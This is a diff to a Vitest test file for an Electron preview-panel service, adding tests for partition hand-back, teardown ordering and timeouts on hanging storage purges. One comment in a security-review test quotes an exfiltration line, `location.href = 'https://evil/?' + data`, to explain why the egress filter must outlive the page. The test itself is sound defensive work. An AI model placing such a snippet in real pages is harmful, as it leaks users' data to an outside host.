@@ -11,6 +11,12 @@
 import { dirname, resolve } from 'node:path'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
+// A test that switches to fake timers and then fails never reaches its own
+// cleanup; without this every later test in the file inherits the fake clock.
+afterEach(() => {
+  vi.useRealTimers()
+})
+
 import { ErrorCode } from '../../../shared/errors'
 import { PREVIEW } from '../../../shared/constants'
 import type { PreviewFailureInput } from '../../../shared/ipc/preview-types'
@@ -249,12 +255,15 @@ function makeHarness(
     clearCache: () => Promise.resolve()
   } as unknown as PreviewSessionLike
 
+  const release = vi.fn<() => Promise<void>>(() => Promise.resolve())
   const session: PreviewSession = {
     view,
     session: sessionLike,
     token,
     realRoot: '/proj',
-    teardown: vi.fn<() => void>()
+    partition: 'erfana-preview-test',
+    teardown: vi.fn<() => void>(),
+    release
   }
 
   const sessionCreate = vi.fn<(ctx: unknown) => Promise<PreviewSession>>(() =>
@@ -327,7 +336,10 @@ function makeHarness(
   let capturedEntryHandlers: EntryHandlers | null = null
 
   const deps: PreviewViewDeps = {
-    sessionFactory: { create: sessionCreate as unknown as PreviewViewDeps['sessionFactory']['create'] },
+    sessionFactory: {
+      create: sessionCreate as unknown as PreviewViewDeps['sessionFactory']['create'],
+      forgetRecycled: vi.fn<() => void>()
+    },
     registry: { rebuildCsp, revoke },
     stillFrameCache: {
       captureIfStale: vi.fn(() => Promise.resolve()),
@@ -952,10 +964,31 @@ describe('PreviewViewService — applyApprovedHosts', () => {
     await h.service.applyApprovedHosts('other', ['cdn.example.com'])
     expect(h.rebuildCsp).not.toHaveBeenCalled()
   })
+
+  it('still reloads when the storage purge never settles (the Allow freeze, 2026-09-03)', async () => {
+    // On Windows, Allow → Confirm sat on "Saving…" forever: the invoke never
+    // came back because an await inside this path never settled. The purge is
+    // belt-and-braces (the opaque origin is the seal, and the reload bypasses
+    // the cache anyway), so a purge that hangs must not hold the grant hostage.
+    vi.useFakeTimers()
+    try {
+      const h = makeHarness()
+      await h.service.open(REQUEST_A, h.window)
+      h.purge.mockImplementationOnce(() => new Promise<void>(() => {}))
+
+      const apply = h.service.applyApprovedHosts('panel-A', ['cdn.example.com'])
+      await vi.advanceTimersByTimeAsync(PREVIEW.PURGE_TIMEOUT_MS + 1)
+      await apply
+
+      expect(h.factory.reloadIgnoringCache).toHaveBeenCalledTimes(1)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
 })
 
 describe('PreviewViewService — destroyAll', () => {
-  it('destroys the live view, revokes the token and purges, freeing the slot', async () => {
+  it('destroys the live view, revokes the token and hands the partition back, freeing the slot', async () => {
     const h = makeHarness()
     await h.service.open(REQUEST_A, h.window)
 
@@ -963,7 +996,9 @@ describe('PreviewViewService — destroyAll', () => {
 
     expect(h.factory.destroy).toHaveBeenCalledTimes(1)
     expect(h.revoke).toHaveBeenCalledWith(h.token)
-    expect(h.purge).toHaveBeenCalledWith(h.session.session)
+    // The purge now runs inside the session's own `release()`, after the page
+    // is destroyed, so the partition can be recycled.
+    expect(h.session.release).toHaveBeenCalledTimes(1)
 
     // The slot is free: a different panel now opens rather than being refused.
     const result = await h.service.open({ ...REQUEST_A, panelId: 'panel-B' }, h.window)
@@ -997,6 +1032,29 @@ describe('PreviewViewService — four lifecycle events', () => {
     expect(h.loadStateChanged).toHaveBeenCalledWith('panel-A', 'failed', 0)
   })
 
+  it('still reports ready when the watch set cannot be established (#112)', async () => {
+    // `setWatchSet` sat outside the pipeline's try/catch: a throw was an
+    // unhandled rejection and the panel stayed on 'loading' with no badge.
+    const h = makeHarness()
+    h.setWatchSet.mockRejectedValueOnce(new Error('EMFILE'))
+    const unhandled = vi.fn()
+    process.on('unhandledRejection', unhandled)
+    try {
+      const result = await h.service.open(REQUEST_A, h.window)
+      expect(result).toEqual({ ok: true })
+      h.loadStateChanged.mockClear()
+
+      h.factory.emit('did-finish-load')
+      await vi.waitFor(() =>
+        expect(h.loadStateChanged).toHaveBeenCalledWith('panel-A', 'ready', expect.any(Number))
+      )
+      await new Promise((r) => setImmediate(r))
+      expect(unhandled).not.toHaveBeenCalled()
+    } finally {
+      process.off('unhandledRejection', unhandled)
+    }
+  })
+
   it('entry-file unlink ⇒ failed + missing-local-file "file deleted" badge', async () => {
     const h = makeHarness()
     await h.service.open(REQUEST_A, h.window)
@@ -1006,6 +1064,8 @@ describe('PreviewViewService — four lifecycle events', () => {
     h.entryHandlers().onUnlink()
 
     expect(h.loadStateChanged).toHaveBeenCalledWith('panel-A', 'failed', 0)
+    // A deleted file's picture must not be what an evicted tab shows later.
+    expect(h.deps.stillFrameCache.invalidate).toHaveBeenCalledWith('panel-A')
     const last = log.records.at(-1)
     expect(last?.type).toBe('missing-local-file')
     expect(last?.reasonCode).toBe(ErrorCode.PREVIEW_LOCAL_FILE_MISSING)
@@ -1169,6 +1229,118 @@ describe('PreviewViewService — teardown races', () => {
 // (sd-074b §4.2–4.5)
 // =============================================================================
 
+describe('PreviewViewService — a window that closes mid-open (#83, #112)', () => {
+  it('abandons the open cleanly when the window closed while the session was building', async () => {
+    // `closeWindow` finds no installed entry for an open still parked on
+    // `create()`, and the claim's generation has not moved, so the open used to
+    // resume, construct a live view against a destroyed window and throw.
+    const h = makeHarness()
+    const build = h.sessionCreate.getMockImplementation()
+    h.sessionCreate.mockImplementationOnce(async (ctx) => {
+      h.setWindowDestroyed(true)
+      return build!(ctx)
+    })
+
+    const result = await h.service.open(REQUEST_A, h.window)
+
+    expect(result).toEqual({ ok: false, errorCode: ErrorCode.PREVIEW_OPEN_SUPERSEDED })
+    expect(h.addChildView).not.toHaveBeenCalled()
+    expect(h.factory.destroy).toHaveBeenCalled()
+  })
+
+  it('unwinds the collaborators built before a constructor throw, incl. the entry watcher (#83)', async () => {
+    // The chokidar entry watcher opens eagerly inside `wirePreviewLifecycle`,
+    // BEFORE `addChildView` — which throws against a destroyed window (probed on
+    // Electron 39: "Object has been destroyed"). The throw left the watcher and
+    // the watch coordinator with no reference and no owner.
+    const h = makeHarness()
+    const entryClose = vi.fn<() => Promise<void>>(() => Promise.resolve())
+    ;(h.deps.createEntryWatcher as unknown as ReturnType<typeof vi.fn>).mockImplementationOnce(
+      () => ({ close: entryClose })
+    )
+    h.addChildView.mockImplementationOnce(() => {
+      throw new Error('Object has been destroyed')
+    })
+
+    const result = await h.service.open(REQUEST_A, h.window)
+
+    expect(result).toEqual({ ok: false, errorCode: ErrorCode.PREVIEW_CSP_INVALID })
+    await vi.waitFor(() => expect(entryClose).toHaveBeenCalledTimes(1))
+    const coordinator = (h.deps.createWatchCoordinator as unknown as ReturnType<typeof vi.fn>).mock
+      .results[0]?.value as { dispose: ReturnType<typeof vi.fn> }
+    // The unwind is async and ordered; the coordinator goes after the watcher.
+    await vi.waitFor(() => expect(coordinator.dispose).toHaveBeenCalled())
+    expect(h.factory.destroy).toHaveBeenCalled()
+  })
+})
+
+describe('PreviewViewService — partition hand-back', () => {
+  it('hands the partition back only after the page is destroyed', async () => {
+    // Releasing earlier would let the next open attach its handler and filter
+    // to a session whose previous page is still running `close()`.
+    const h = makeHarness()
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.close('panel-A')
+
+    expect(h.session.release).toHaveBeenCalledTimes(1)
+    const destroyedAt = h.factory.destroy.mock.invocationCallOrder[0]
+    const releasedAt = (h.session.release as ReturnType<typeof vi.fn>).mock.invocationCallOrder[0]
+    expect(destroyedAt).toBeLessThan(releasedAt)
+  })
+
+  it('keeps the filter, the protocol handler and the permission denials attached until the page is destroyed', async () => {
+    // Security review: detaching them first left the hostile page up to ~3 s
+    // with no egress gate and default permission handlers — a queued
+    // `location.href = 'https://evil/?' + data` landed the moment the
+    // `will-navigate` lock went, with nothing left to cancel the request.
+    const h = makeHarness()
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.close('panel-A')
+
+    const destroyedAt = h.factory.destroy.mock.invocationCallOrder[0]
+    const detachedAt = (h.session.teardown as ReturnType<typeof vi.fn>).mock.invocationCallOrder[0]
+    expect(detachedAt).toBeGreaterThan(destroyedAt)
+  })
+
+  it('does not hand the partition back when the detach threw', async () => {
+    // A name that goes back with a stale handler attached would make the next
+    // open on it fail at `attachProtocol`; dropping it is the safe outcome.
+    const h = makeHarness()
+    ;(h.session.teardown as ReturnType<typeof vi.fn>).mockImplementationOnce(() => {
+      throw new Error('unhandle failed')
+    })
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.close('panel-A')
+
+    expect(h.session.release).not.toHaveBeenCalled()
+  })
+
+  it('hands back a session that was built but never installed', async () => {
+    const h = makeHarness()
+    const build = h.sessionCreate.getMockImplementation()
+    h.sessionCreate.mockImplementationOnce(async (ctx) => {
+      h.setWindowDestroyed(true)
+      return build!(ctx)
+    })
+
+    await h.service.open(REQUEST_A, h.window)
+
+    expect(h.session.release).toHaveBeenCalledTimes(1)
+  })
+
+  it('forgets recycled partitions on a project switch, so nothing carries across projects', async () => {
+    const h = makeHarness()
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.onProjectChanged('/proj', '/other')
+
+    expect(h.deps.sessionFactory.forgetRecycled).toHaveBeenCalledTimes(1)
+  })
+})
+
 describe('PreviewViewService — live-view budget', () => {
   /** Open `count` panels named panel-1..panel-N in order. */
   async function openPanels(h: Harness, count: number): Promise<void> {
@@ -1226,6 +1398,23 @@ describe('PreviewViewService — live-view budget', () => {
     expect(size).toEqual({ width: expect.any(Number), height: expect.any(Number) })
     // And it can still be thrown away if the view goes before it finishes.
     expect(opts.shouldKeep()).toBe(true)
+  })
+
+  it('keeps the cached still frame when the page reloads while hidden', async () => {
+    // The pipeline used to drop the frame on every run and only recapture while
+    // visible, so a file saved behind a hidden tab left that tab with nothing to
+    // show until it was looked at again — a colour block, not the page.
+    const h = makeHarness()
+    await h.service.open(REQUEST_A, h.window)
+    await h.service.setVisibility('panel-A', false, 'dialog')
+    const invalidate = h.deps.stillFrameCache.invalidate as unknown as ReturnType<typeof vi.fn>
+    invalidate.mockClear()
+    h.loadStateChanged.mockClear()
+
+    h.factory.emit('did-finish-load')
+    await vi.waitFor(() => expect(h.loadStateChanged).toHaveBeenCalledWith('panel-A', 'ready', 0))
+
+    expect(invalidate).not.toHaveBeenCalled()
   })
 
   it('publishes the cached frame on hide, so the panel is never a blank rectangle', async () => {
@@ -1299,6 +1488,73 @@ describe('PreviewViewService — live-view budget', () => {
    * renderer never told it was suspended, so its resume effect never fires and
    * the tab is permanently dead (lens review F8).
    */
+  it('still reports a panel suspended, and destroys it, when the purge never settles', async () => {
+    // Windows, 2026-09-03: `clearStorageData` on the live session never came
+    // back, so eviction hung inside `teardown`, the old renderer process was
+    // never destroyed, and `'suspended'` never reached the tab — which then
+    // showed a flat colour block for good. Every teardown step is bounded now.
+    vi.useFakeTimers()
+    try {
+      const h = makeHarness()
+      h.purge.mockImplementation(() => new Promise<void>(() => {}))
+
+      const opened = openPanels(h, PREVIEW.MAX_LIVE_VIEWS + 1)
+      for (let i = 0; i < 10; i += 1) {
+        await vi.advanceTimersByTimeAsync(PREVIEW.TEARDOWN_STEP_TIMEOUT_MS / 2)
+      }
+      await opened
+
+      const suspended = h.loadStateChanged.mock.calls
+        .filter(([, state]) => state === 'suspended')
+        .map(([panelId]) => panelId)
+      expect(suspended).toEqual(['panel-1'])
+      expect(h.factory.destroy).toHaveBeenCalled()
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  it('suspends anyway when the still-frame capture never settles', async () => {
+    vi.useFakeTimers()
+    try {
+      const h = makeHarness()
+      const capture = h.deps.stillFrameCache.captureIfStale as unknown as ReturnType<typeof vi.fn>
+      capture.mockReturnValue(new Promise<void>(() => {}))
+
+      const opened = openPanels(h, PREVIEW.MAX_LIVE_VIEWS + 1)
+      for (let i = 0; i < 10; i += 1) {
+        await vi.advanceTimersByTimeAsync(PREVIEW.CAPTURE_SETTLE_TIMEOUT_MS / 2)
+      }
+      await opened
+
+      const suspended = h.loadStateChanged.mock.calls
+        .filter(([, state]) => state === 'suspended')
+        .map(([panelId]) => panelId)
+      expect(suspended).toEqual(['panel-1'])
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  it('close() still destroys the view when the purge never settles', async () => {
+    vi.useFakeTimers()
+    try {
+      const h = makeHarness()
+      await h.service.open(REQUEST_A, h.window)
+      h.purge.mockImplementation(() => new Promise<void>(() => {}))
+
+      const closing = h.service.close('panel-A')
+      for (let i = 0; i < 10; i += 1) {
+        await vi.advanceTimersByTimeAsync(PREVIEW.TEARDOWN_STEP_TIMEOUT_MS / 2)
+      }
+      await closing
+
+      expect(h.factory.destroy).toHaveBeenCalled()
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
   it('still tears the view down when the still-frame capture rejects', async () => {
     const h = makeHarness()
     const capture = h.deps.stillFrameCache.captureIfStale as unknown as ReturnType<typeof vi.fn>
